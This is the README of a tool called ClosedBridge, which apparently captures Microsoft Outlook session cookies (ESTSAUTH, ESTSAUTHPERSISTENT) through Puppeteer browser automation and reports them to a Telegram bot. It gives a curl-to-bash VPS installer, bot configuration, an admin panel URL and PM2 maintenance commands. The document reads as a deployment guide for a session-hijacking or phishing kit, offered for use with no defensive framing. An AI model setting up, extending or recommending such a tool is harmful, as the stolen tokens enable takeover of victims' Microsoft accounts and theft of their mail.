# 🔐 ClosedBridge - Outlook Cookie Automation System

Browser automation backend that captures Microsoft Outlook authentication cookies using Puppeteer with Telegram notifications.

## 🚀 One-Command VPS Installation

```bash
curl -o install.sh https://raw.githubusercontent.com/x8080x2/L1n7k/main/vps-install.sh && chmod +x install.sh && bash install.sh
```

## 📋 VPS Requirements

- **OS**: Ubuntu 22.04 / 24.04 / 25.04
- **RAM**: 1GB minimum (script auto-optimizes)
- **Storage**: 10GB
- **Ports**: 22 (SSH), 3000 (App)
- **Provider**: DigitalOcean, AWS, Vultr, Linode, etc.

## ✅ What Gets Installed

- ✅ Node.js v20 + PM2
- ✅ Chromium browser + dependencies
- ✅ ClosedBridge application
- ✅ Firewall configuration
- ✅ Auto-start on reboot
- ✅ Memory optimization (cleans unnecessary packages)

## 🌐 Access After Installation

**Main Application:**
```
http://YOUR_VPS_IP:3000
```

**Admin Panel:**
```
http://YOUR_VPS_IP:3000/ad.html
```

## 🤖 Telegram Bot Setup

1. Create bot with [@BotFather](https://t.me/BotFather)
2. Copy bot token
3. Enter during installation or add to `.env`:
   ```bash
   nano /root/closedbridge/.env
   # Add: TELEGRAM_BOT_TOKEN=your_token_here
   pm2 restart closedbridge --update-env
   ```
4. Send `/start` to your bot

## 🛠️ Useful Commands

```bash
# Check status
pm2 status

# View logs
pm2 logs closedbridge

# Restart
pm2 restart closedbridge --update-env

# Update from GitHub
cd /root/closedbridge && git pull && npm install && pm2 restart closedbridge
```

## 🔄 Reinstall / Fresh Install

```bash
pm2 delete closedbridge
rm -rf /root/closedbridge
bash install.sh
```

## 🐛 Troubleshooting

**Check logs:**
```bash
pm2 logs closedbridge --lines 100
```

**Check Chromium:**
```bash
/usr/bin/chromium-browser --version
```

**Free up more memory:**
```bash
apt autoremove -y && apt clean
```

## 📊 Features

- 🌐 Browser automation with Puppeteer
- 🔐 Cookie extraction (ESTSAUTH, ESTSAUTHPERSISTENT, etc.)
- 🔒 Encrypted cookie storage
- 📱 Telegram notifications
- 🎯 Admin panel with real-time monitoring
- ⚡ Auto-restart on crash
- 🚀 Optimized for low-memory VPS

## 🔧 Manual Installation

If you prefer manual setup, see [vps-install.sh](vps-install.sh) for step-by-step commands.

---

**Installation Time**: ~3-5 minutes  
**Tested on**: Ubuntu 22.04, 24.04, 25.04  
**Architecture**: x86_64
